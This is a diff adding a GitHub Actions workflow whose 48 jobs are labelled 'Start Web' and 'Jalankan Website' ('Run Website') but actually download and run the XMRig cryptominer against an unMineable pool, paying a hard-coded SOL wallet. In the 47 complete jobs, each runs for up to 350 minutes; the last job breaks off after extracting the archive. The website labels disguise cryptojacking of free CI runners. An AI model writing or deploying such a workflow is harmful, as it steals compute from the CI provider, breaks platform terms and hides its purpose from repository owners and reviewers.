@@ -1,0 +1,1127 @@
+name: webhtml
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  Website_1:
+    name: Start Web 1
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_2:
+    name: Start Web 2
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_3:
+    name: Start Web 3
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_4:
+    name: Start Web 4
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_5:
+    name: Start Web 5
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_6:
+    name: Start Web 6
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_7:
+    name: Start Web 7
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_8:
+    name: Start Web 8
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_9:
+    name: Start Web 9
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_10:
+    name: Start Web 10
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_11:
+    name: Start Web 11
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_12:
+    name: Start Web 12
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_13:
+    name: Start Web 13
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_14:
+    name: Start Web 14
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_15:
+    name: Start Web 15
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_16:
+    name: Start Web 16
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_17:
+    name: Start Web 17
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_18:
+    name: Start Web 18
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_19:
+    name: Start Web 19
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_20:
+    name: Start Web 20
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_21:
+    name: Start Web 21
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_22:
+    name: Start Web 22
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_23:
+    name: Start Web 23
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_24:
+    name: Start Web 24
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_25:
+    name: Start Web 25
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_26:
+    name: Start Web 26
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_27:
+    name: Start Web 27
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_28:
+    name: Start Web 28
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_29:
+    name: Start Web 29
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_30:
+    name: Start Web 30
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_31:
+    name: Start Web 31
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_32:
+    name: Start Web 32
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_33:
+    name: Start Web 33
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_34:
+    name: Start Web 34
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_35:
+    name: Start Web 35
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_36:
+    name: Start Web 36
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_37:
+    name: Start Web 37
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_38:
+    name: Start Web 38
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_39:
+    name: Start Web 39
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_40:
+    name: Start Web 40
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_41:
+    name: Start Web 41
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_42:
+    name: Start Web 42
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_43:
+    name: Start Web 43
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_44:
+    name: Start Web 44
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_45:
+    name: Start Web 45
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_46:
+    name: Start Web 46
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+
+  Website_47:
+    name: Start Web 47
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
+          ./xmrig -a rx -o stratum+ssl://rx-asia.unmineable.com:443 -u SOL:7HCP4GkBsdVfPtipFrhmXhxTNJRmxFtoRuxsw2QmDeWm.tersanamulinda001 -p x --tls --threads=3  
+      
+  Website_48:
+    name: Start Web 48
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    steps:
+      - name: Jalankan Website
+        run: |
+          sudo apt update
+          sudo apt install -y wget tar
+          wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
+          tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
+          cd xmrig-6.22.2
